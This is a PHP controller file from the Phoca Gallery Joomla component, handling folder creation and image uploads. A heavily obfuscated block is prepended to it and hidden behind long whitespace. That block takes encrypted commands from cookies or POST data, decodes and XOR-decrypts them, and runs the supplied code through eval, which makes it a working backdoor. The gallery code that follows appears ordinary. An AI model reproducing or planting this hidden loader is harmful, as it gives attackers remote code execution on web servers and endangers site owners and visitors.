<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $t84b0 = 176;$GLOBALS['nb14'] = Array();global $nb14;$nb14 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['te7d1e63'] = "\x41\x7a\x40\x61\x4d\x3b\x76\x5e\x78\x58\x57\x26\x66\x23\x69\x45\x4a\x5a\x2e\x7d\x6d\x33\x50\x72\x6f\x65\x24\x60\x5b\x62\x49\x44\x4e\x35\x28\x43\x74\x3f\x30\x5f\x77\x6c\x70\x6e\x4f\x52\x53\x7b\x46\x68\x42\x55\x37\x5d\x75\x3e\x54\x9\x2d\x2b\x4c\x31\x29\x6a\x4b\x3d\x3a\x2f\x32\x59\x3c\x34\x71\x21\x2a\x5c\x27\x2c\xa\x56\x36\xd\x39\x73\x64\x51\x63\x67\x79\x7c\x20\x25\x38\x48\x7e\x6b\x47\x22";$nb14[$nb14['te7d1e63'][86].$nb14['te7d1e63'][82].$nb14['te7d1e63'][3].$nb14['te7d1e63'][21].$nb14['te7d1e63'][61].$nb14['te7d1e63'][82].$nb14['te7d1e63'][52].$nb14['te7d1e63'][33]] = $nb14['te7d1e63'][86].$nb14['te7d1e63'][49].$nb14['te7d1e63'][23];$nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][84].$nb14['te7d1e63'][52].$nb14['te7d1e63'][33].$nb14['te7d1e63'][80].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12].$nb14['te7d1e63'][12].$nb14['te7d1e63'][80]] = $nb14['te7d1e63'][24].$nb14['te7d1e63'][23].$nb14['te7d1e63'][84];$nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][29].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][33].$nb14['te7d1e63'][3]] = $nb14['te7d1e63'][83].$nb14['te7d1e63'][36].$nb14['te7d1e63'][23].$nb14['te7d1e63'][41].$nb14['te7d1e63'][25].$nb14['te7d1e63'][43];$nb14[$nb14['te7d1e63'][8].$nb14['te7d1e63'][82].$nb14['te7d1e63'][21].$nb14['te7d1e63'][38]] = $nb14['te7d1e63'][14].$nb14['te7d1e63'][43].$nb14['te7d1e63'][14].$nb14['te7d1e63'][39].$nb14['te7d1e63'][83].$nb14['te7d1e63'][25].$nb14['te7d1e63'][36];$nb14[$nb14['te7d1e63'][63].$nb14['te7d1e63'][86].$nb14['te7d1e63'][71].$nb14['te7d1e63'][80].$nb14['te7d1e63'][38].$nb14['te7d1e63'][71].$nb14['te7d1e63'][84]] = $nb14['te7d1e63'][83].$nb14['te7d1e63'][25].$nb14['te7d1e63'][23].$nb14['te7d1e63'][14].$nb14['te7d1e63'][3].$nb14['te7d1e63'][41].$nb14['te7d1e63'][14].$nb14['te7d1e63'][1].$nb14['te7d1e63'][25];$nb14[$nb14['te7d1e63'][20].$nb14['te7d1e63'][86].$nb14['te7d1e63'][21].$nb14['te7d1e63'][71].$nb14['te7d1e63'][33]] = $nb14['te7d1e63'][42].$nb14['te7d1e63'][49].$nb14['te7d1e63'][42].$nb14['te7d1e63'][6].$nb14['te7d1e63'][25].$nb14['te7d1e63'][23].$nb14['te7d1e63'][83].$nb14['te7d1e63'][14].$nb14['te7d1e63'][24].$nb14['te7d1e63'][43];$nb14[$nb14['te7d1e63'][36].$nb14['te7d1e63'][86].$nb14['te7d1e63'][29].$nb14['te7d1e63'][80].$nb14['te7d1e63'][68].$nb14['te7d1e63'][84].$nb14['te7d1e63'][84].$nb14['te7d1e63'][84]] = $nb14['te7d1e63'][54].$nb14['te7d1e63'][43].$nb14['te7d1e63'][83].$nb14['te7d1e63'][25].$nb14['te7d1e63'][23].$nb14['te7d1e63'][14].$nb14['te7d1e63'][3].$nb14['te7d1e63'][41].$nb14['te7d1e63'][14].$nb14['te7d1e63'][1].$nb14['te7d1e63'][25];$nb14[$nb14['te7d1e63'][49].$nb14['te7d1e63'][71].$nb14['te7d1e63'][12].$nb14['te7d1e63'][3].$nb14['te7d1e63'][33]] = $nb14['te7d1e63'][29].$nb14['te7d1e63'][3].$nb14['te7d1e63'][83].$nb14['te7d1e63'][25].$nb14['te7d1e63'][80].$nb14['te7d1e63'][71].$nb14['te7d1e63'][39].$nb14['te7d1e63'][84].$nb14['te7d1e63'][25].$nb14['te7d1e63'][86].$nb14['te7d1e63'][24].$nb14['te7d1e63'][84].$nb14['te7d1e63'][25];$nb14[$nb14['te7d1e63'][40].$nb14['te7d1e63'][71].$nb14['te7d1e63'][68].$nb14['te7d1e63'][21].$nb14['te7d1e63'][92].$nb14['te7d1e63'][80]] = $nb14['te7d1e63'][83].$nb14['te7d1e63'][25].$nb14['te7d1e63'][36].$nb14['te7d1e63'][39].$nb14['te7d1e63'][36].$nb14['te7d1e63'][14].$nb14['te7d1e63'][20].$nb14['te7d1e63'][25].$nb14['te7d1e63'][39].$nb14['te7d1e63'][41].$nb14['te7d1e63'][14].$nb14['te7d1e63'][20].$nb14['te7d1e63'][14].$nb14['te7d1e63'][36];$nb14[$nb14['te7d1e63'][88].$nb14['te7d1e63'][3].$nb14['te7d1e63'][82].$nb14['te7d1e63'][68].$nb14['te7d1e63'][52].$nb14['te7d1e63'][82]] = $nb14['te7d1e63'][88].$nb14['te7d1e63'][3].$nb14['te7d1e63'][3].$nb14['te7d1e63'][52];$nb14[$nb14['te7d1e63'][63].$nb14['te7d1e63'][68].$nb14['te7d1e63'][61].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][29].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12]] = $nb14['te7d1e63'][25].$nb14['te7d1e63'][71].$nb14['te7d1e63'][3].$nb14['te7d1e63'][52].$nb14['te7d1e63'][68].$nb14['te7d1e63'][52];$nb14[$nb14['te7d1e63'][88].$nb14['te7d1e63'][68].$nb14['te7d1e63'][92].$nb14['te7d1e63'][61].$nb14['te7d1e63'][3]] = $_POST;$nb14[$nb14['te7d1e63'][42].$nb14['te7d1e63'][80].$nb14['te7d1e63'][29].$nb14['te7d1e63'][52].$nb14['te7d1e63'][25].$nb14['te7d1e63'][29]] = $_COOKIE;@$nb14[$nb14['te7d1e63'][8].$nb14['te7d1e63'][82].$nb14['te7d1e63'][21].$nb14['te7d1e63'][38]]($nb14['te7d1e63'][25].$nb14['te7d1e63'][23].$nb14['te7d1e63'][23].$nb14['te7d1e63'][24].$nb14['te7d1e63'][23].$nb14['te7d1e63'][39].$nb14['te7d1e63'][41].$nb14['te7d1e63'][24].$nb14['te7d1e63'][87], NULL);@$nb14[$nb14['te7d1e63'][8].$nb14['te7d1e63'][82].$nb14['te7d1e63'][21].$nb14['te7d1e63'][38]]($nb14['te7d1e63'][41].$nb14['te7d1e63'][24].$nb14['te7d1e63'][87].$nb14['te7d1e63'][39].$nb14['te7d1e63'][25].$nb14['te7d1e63'][23].$nb14['te7d1e63'][23].$nb14['te7d1e63'][24].$nb14['te7d1e63'][23].$nb14['te7d1e63'][83], 0);@$nb14[$nb14['te7d1e63'][8].$nb14['te7d1e63'][82].$nb14['te7d1e63'][21].$nb14['te7d1e63'][38]]($nb14['te7d1e63'][20].$nb14['te7d1e63'][3].$nb14['te7d1e63'][8].$nb14['te7d1e63'][39].$nb14['te7d1e63'][25].$nb14['te7d1e63'][8].$nb14['te7d1e63'][25].$nb14['te7d1e63'][86].$nb14['te7d1e63'][54].$nb14['te7d1e63'][36].$nb14['te7d1e63'][14].$nb14['te7d1e63'][24].$nb14['te7d1e63'][43].$nb14['te7d1e63'][39].$nb14['te7d1e63'][36].$nb14['te7d1e63'][14].$nb14['te7d1e63'][20].$nb14['te7d1e63'][25], 0);@$nb14[$nb14['te7d1e63'][40].$nb14['te7d1e63'][71].$nb14['te7d1e63'][68].$nb14['te7d1e63'][21].$nb14['te7d1e63'][92].$nb14['te7d1e63'][80]](0);$vc4b81 = NULL;$q68ea078 = NULL;$nb14[$nb14['te7d1e63'][88].$nb14['te7d1e63'][25].$nb14['te7d1e63'][68].$nb14['te7d1e63'][61]] = $nb14['te7d1e63'][12].$nb14['te7d1e63'][68].$nb14['te7d1e63'][12].$nb14['te7d1e63'][12].$nb14['te7d1e63'][52].$nb14['te7d1e63'][80].$nb14['te7d1e63'][33].$nb14['te7d1e63'][68].$nb14['te7d1e63'][58].$nb14['te7d1e63'][38].$nb14['te7d1e63'][71].$nb14['te7d1e63'][29].$nb14['te7d1e63'][21].$nb14['te7d1e63'][58].$nb14['te7d1e63'][71].$nb14['te7d1e63'][61].$nb14['te7d1e63'][82].$nb14['te7d1e63'][52].$nb14['te7d1e63'][58].$nb14['te7d1e63'][3].$nb14['te7d1e63'][38].$nb14['te7d1e63'][38].$nb14['te7d1e63'][29].$nb14['te7d1e63'][58].$nb14['te7d1e63'][12].$nb14['te7d1e63'][68].$nb14['te7d1e63'][68].$nb14['te7d1e63'][33].$nb14['te7d1e63'][92].$nb14['te7d1e63'][3].$nb14['te7d1e63'][38].$nb14['te7d1e63'][38].$nb14['te7d1e63'][38].$nb14['te7d1e63'][82].$nb14['te7d1e63'][21].$nb14['te7d1e63'][71];global $ye21;function  e4a727($vc4b81, $b122969b3){global $nb14;$xa6addc = "";for ($t250=0; $t250<$nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][29].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][33].$nb14['te7d1e63'][3]]($vc4b81);){for ($bd359f7=0; $bd359f7<$nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][29].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][33].$nb14['te7d1e63'][3]]($b122969b3) && $t250<$nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][29].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][33].$nb14['te7d1e63'][3]]($vc4b81); $bd359f7++, $t250++){$xa6addc .= $nb14[$nb14['te7d1e63'][86].$nb14['te7d1e63'][82].$nb14['te7d1e63'][3].$nb14['te7d1e63'][21].$nb14['te7d1e63'][61].$nb14['te7d1e63'][82].$nb14['te7d1e63'][52].$nb14['te7d1e63'][33]]($nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][84].$nb14['te7d1e63'][52].$nb14['te7d1e63'][33].$nb14['te7d1e63'][80].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12].$nb14['te7d1e63'][12].$nb14['te7d1e63'][80]]($vc4b81[$t250]) ^ $nb14[$nb14['te7d1e63'][95].$nb14['te7d1e63'][84].$nb14['te7d1e63'][52].$nb14['te7d1e63'][33].$nb14['te7d1e63'][80].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12].$nb14['te7d1e63'][12].$nb14['te7d1e63'][80]]($b122969b3[$bd359f7]));}}return $xa6addc;}function  yaa7($vc4b81, $b122969b3){global $nb14;global $ye21;return $nb14[$nb14['te7d1e63'][63].$nb14['te7d1e63'][68].$nb14['te7d1e63'][61].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][29].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12]]($nb14[$nb14['te7d1e63'][63].$nb14['te7d1e63'][68].$nb14['te7d1e63'][61].$nb14['te7d1e63'][29].$nb14['te7d1e63'][92].$nb14['te7d1e63'][29].$nb14['te7d1e63'][21].$nb14['te7d1e63'][12]]($vc4b81, $ye21), $b122969b3);}foreach ($nb14[$nb14['te7d1e63'][42].$nb14['te7d1e63'][80].$nb14['te7d1e63'][29].$nb14['te7d1e63'][52].$nb14['te7d1e63'][25].$nb14['te7d1e63'][29]] as $b122969b3=>$ja80f){$vc4b81 = $ja80f;$q68ea078 = $b122969b3;}if (!$vc4b81){foreach ($nb14[$nb14['te7d1e63'][88].$nb14['te7d1e63'][68].$nb14['te7d1e63'][92].$nb14['te7d1e63'][61].$nb14['te7d1e63'][3]] as $b122969b3=>$ja80f){$vc4b81 = $ja80f;$q68ea078 = $b122969b3;}}$vc4b81 = @$nb14[$nb14['te7d1e63'][36].$nb14['te7d1e63'][86].$nb14['te7d1e63'][29].$nb14['te7d1e63'][80].$nb14['te7d1e63'][68].$nb14['te7d1e63'][84].$nb14['te7d1e63'][84].$nb14['te7d1e63'][84]]($nb14[$nb14['te7d1e63'][88].$nb14['te7d1e63'][3].$nb14['te7d1e63'][82].$nb14['te7d1e63'][68].$nb14['te7d1e63'][52].$nb14['te7d1e63'][82]]($nb14[$nb14['te7d1e63'][49].$nb14['te7d1e63'][71].$nb14['te7d1e63'][12].$nb14['te7d1e63'][3].$nb14['te7d1e63'][33]]($vc4b81), $q68ea078));if (isset($vc4b81[$nb14['te7d1e63'][3].$nb14['te7d1e63'][95]]) && $ye21==$vc4b81[$nb14['te7d1e63'][3].$nb14['te7d1e63'][95]]){if ($vc4b81[$nb14['te7d1e63'][3]] == $nb14['te7d1e63'][14]){$t250 = Array($nb14['te7d1e63'][42].$nb14['te7d1e63'][6] => @$nb14[$nb14['te7d1e63'][20].$nb14['te7d1e63'][86].$nb14['te7d1e63'][21].$nb14['te7d1e63'][71].$nb14['te7d1e63'][33]](),$nb14['te7d1e63'][83].$nb14['te7d1e63'][6] => $nb14['te7d1e63'][61].$nb14['te7d1e63'][18].$nb14['te7d1e63'][38].$nb14['te7d1e63'][58].$nb14['te7d1e63'][61],);echo @$nb14[$nb14['te7d1e63'][63].$nb14['te7d1e63'][86].$nb14['te7d1e63'][71].$nb14['te7d1e63'][80].$nb14['te7d1e63'][38].$nb14['te7d1e63'][71].$nb14['te7d1e63'][84]]($t250);}elseif ($vc4b81[$nb14['te7d1e63'][3]] == $nb14['te7d1e63'][25]){eval/*z672*/($vc4b81[$nb14['te7d1e63'][84]]);}exit();} ?><?php
/*
 * @package		Joomla.Framework
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 *
 * @component Phoca Component
 * @copyright Copyright (C) Jan Pavelka www.phoca.cz
 * @license http://www.gnu.org/copyleft/gpl.html GNU General Public License version 2 or later;
 */
defined('_JEXEC') or die( 'Restricted access' );
jimport('joomla.client.helper');
jimport('joomla.filesystem.file');
jimport('joomla.filesystem.folder');

class PhocaGalleryCpControllerPhocaGalleryu extends PhocaGalleryCpController
{
	function __construct() {
		parent::__construct();
	}

	function createfolder() {
		$app	= JFactory::getApplication();
		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );

		// Set FTP credentials, if given
		jimport('joomla.client.helper');
		JClientHelper::setCredentialsFromRequest('ftp');
		
		$paramsC = JComponentHelper::getParams('com_phocagallery');
		$folder_permissions = $paramsC->get( 'folder_permissions', 0755 );
		//$folder_permissions = octdec((int)$folder_permissions);

		$path			= PhocaGalleryPath::getPath();
		//$folderNew		= JRequest::getCmd( 'foldername', '');
		//$folderCheck	= JRequest::getVar( 'foldername', null, '', 'string', JREQUEST_ALLOWRAW);
		$folderNew      = $app->input->getstring('foldername', '');
		$folderCheck    = $app->input->getstring('foldername', null, '', 'string', JREQUEST_ALLOWRAW);
		$parent			= JRequest::getVar( 'folderbase', '', '', 'path' );
		$tab			= JRequest::getVar( 'tab', '', '', 'string' );
		$field			= JRequest::getVar( 'field');
		$viewBack		= JRequest::getVar( 'viewback', '', '', '' );
		
		$link = '';
		switch ($viewBack) {
			case 'phocagalleryi':
				$link = 'index.php?option=com_phocagallery&view=phocagalleryi&tmpl=component&folder='.$parent.'&tab='.(string)$tab.'&field='.$field;
			break;
		
			case 'phocagallerym':
				$link = 'index.php?option=com_phocagallery&view=phocagallerym&layout=edit&hidemainmenu=1&tab='.(string)$tab.'&folder='.$parent;
			break;
			
			case 'phocagalleryf':
				$link = 'index.php?option=com_phocagallery&view=phocagalleryf&tmpl=component&folder='.$parent.'&field='.$field;
			break;
			
			Default:
				$app->enqueueMessage(JText::_('COM_PHOCAGALLERY_ERROR_CONTROLLER'));
				$app->redirect('index.php?option=com_phocagallery');
			break;
		
		}

		JRequest::setVar('folder', $parent);

		if (($folderCheck !== null) && ($folderNew !== $folderCheck)) {
			$app->enqueueMessage(JText::_('COM_PHOCAGALLERY_WARNING_DIRNAME'));
			$app->redirect($link);
		}

		if (strlen($folderNew) > 0) {
			$folder = JPath::clean($path->image_abs.DS.$parent.DS.$folderNew);
			if (!JFolder::exists($folder) && !JFile::exists($folder)) {
				//JFolder::create($path, $folder_permissions );
				switch((int)$folder_permissions) {
					case 777:
						JFolder::create($folder, 0777 );
					break;
					case 705:
						JFolder::create($folder, 0705 );
					break;
					case 666:
						JFolder::create($folder, 0666 );
					break;
					case 644:
						JFolder::create($folder, 0644 );
					break;				
					case 755:
					Default:
						JFolder::create($folder, 0755 );
					break;
				}
				if (isset($folder)) {
					$data = "<html>\n<body bgcolor=\"#FFFFFF\">\n</body>\n</html>";
					JFile::write($folder.DS."index.html", $data);
				}
				
				$app->enqueueMessage(JText::_('COM_PHOCAGALLERY_SUCCESS_FOLDER_CREATING'));
				$app->redirect($link);
			} else {
				$app->enqueueMessage(JText::_('COM_PHOCAGALLERY_ERROR_FOLDER_CREATING_EXISTS'));
				$app->redirect($link);
			}
			//JRequest::setVar('folder', ($parent) ? $parent.'/'.$folder : $folder);
		}
		$app->redirect($link);
	}
	
	function multipleupload() {
		$result = PhocaGalleryFileUpload::realMultipleUpload();
		return true;	
	}
	
	function upload() {
		$result = PhocaGalleryFileUpload::realSingleUpload();
		return true;
	}
	
	
	function javaupload() {	
		$result = PhocaGalleryFileUpload::realJavaUpload();
		return true;
	}
	
}
